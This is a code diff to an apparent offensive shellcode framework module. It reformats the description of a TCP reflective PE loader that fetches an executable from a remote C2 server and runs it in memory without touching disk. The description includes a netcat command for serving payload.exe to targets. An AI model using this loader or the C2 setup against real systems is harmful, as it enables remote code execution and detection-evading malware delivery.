@@ -38,22 +38,20 @@ class Shellcode():
     summary = ("TCP-based reflective PE loader over IPV4 which executes a PE from a"
                " remote server")
 
-    description = f"""
-    TCP based reflective PE loader over IPV4 that will connect to a remote C2 server
-    and download a PE. Once downloaded, the PE will be executed in memory without
-    touching disk.
+    description = ("TCP based reflective PE loader over IPV4 that will connect to a remote C2 server"
+                   " and download a PE. Once downloaded, the PE will be executed in memory without"
+                   " touching disk.\n\n"
 
-    As an example, you \"C2 Server\" can be as simple as Netcat:
+                   "As an example, you \"C2 Server\" can be as simple as Netcat:\n\n"
 
-        nc -w 15 -lvp 42 < payload.exe
+                   "    nc -w 15 -lvp 42 < payload.exe\n\n"
 
-    Then you can generate the shellcode accordingly:
+                   "Then you can generate the shellcode accordingly:\n\n"
 
-        {example_run}
+                   f"    {example_run}\n\n"
 
-    Upon execution of the shellcode, you should get a connection from the target and
-    your PE should execute in memory.
-    """
+                   "Upon execution of the shellcode, you should get a connection from the target and"
+                   " your PE should execute in memory.")
 
     arguments = {}
     arguments["LHOST"] = {}
